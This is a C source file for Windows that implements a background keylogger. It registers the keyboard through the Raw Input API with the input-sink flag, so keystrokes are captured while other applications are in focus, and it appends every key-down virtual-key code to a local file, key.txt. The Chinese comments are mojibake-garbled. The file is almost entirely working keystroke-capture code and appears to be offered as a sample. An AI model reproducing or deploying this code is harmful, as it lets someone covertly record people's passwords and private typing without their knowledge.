#include <stdio.h>
#include <windows.h>
#include "resource.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawInput = { 0 };
	UINT dwSize = sizeof(rawInput);
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawInput, &dwSize, sizeof(RAWINPUTHEADER)); // ��ȡԭʼ��������
	if (rawInput.header.dwType == RIM_TYPEKEYBOARD)
	{
		if ((rawInput.data.keyboard.Message == WM_KEYDOWN) || (rawInput.data.keyboard.Message == WM_SYSKEYDOWN))
		{
			char wcKey[256];
			sprintf(wcKey, "%d", rawInput.data.keyboard.VKey);
			FILE* fp = NULL;
			fopen_s(&fp, "key.txt", "a+");
			if (fp == NULL)
			{
				MessageBox(NULL, "�ļ�����ʧ��", "����", MB_OK);
				return FALSE;
			}
			fwrite(wcKey, strlen(wcKey) + 1, 1, fp);
			fclose(fp);
		}
	}
	return TRUE;
}

BOOL CALLBACK DlgMsgCallback(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	if (uiMsg == WM_INITDIALOG)
	{
		// ע��ԭʼ�����豸
		RAWINPUTDEVICE rawInputDevice = { 0 };
		rawInputDevice.usUsagePage = 0x1; // ԭʼ�����豸�Ķ�������ʹ�����ҳ
		rawInputDevice.usUsage = 0x6; // ԭʼ�����豸�Ķ�������ʹ����� ID 0x0006-0x0007 ����/���������������ӳ������������
		rawInputDevice.hwndTarget = hWnd;
		rawInputDevice.dwFlags = RIDEV_INPUTSINK; // ָ����ν��� usUsagePage �� usUsage �ṩ����Ϣ��ģʽ��־ RIDEV_INPUTSINK 0x00000100 ��������ã���ʹ���÷�����ǰ̨�����÷�Ҳ�ܹ��������롣 ��ע�⣬����ָ�� hwndTarget ��
		::RegisterRawInputDevices(&rawInputDevice, 1, sizeof(rawInputDevice)); // ע��ԭʼ�����豸
		return TRUE;
	}
	else if (uiMsg == WM_CLOSE)
	{
		// �رմ���
		EndDialog(hWnd, NULL);
	}
	else if (uiMsg == WM_INPUT)
	{
		// ���水��
		GetData(lParam);
	}
	return TRUE;
}

int main()
{
	HINSTANCE hInstance = GetModuleHandle(NULL);
	DialogBoxParam(hInstance, (LPCSTR)IDD_DIALOG1, NULL, (DLGPROC)DlgMsgCallback, NULL);
	ExitProcess(0);
	return 0;
}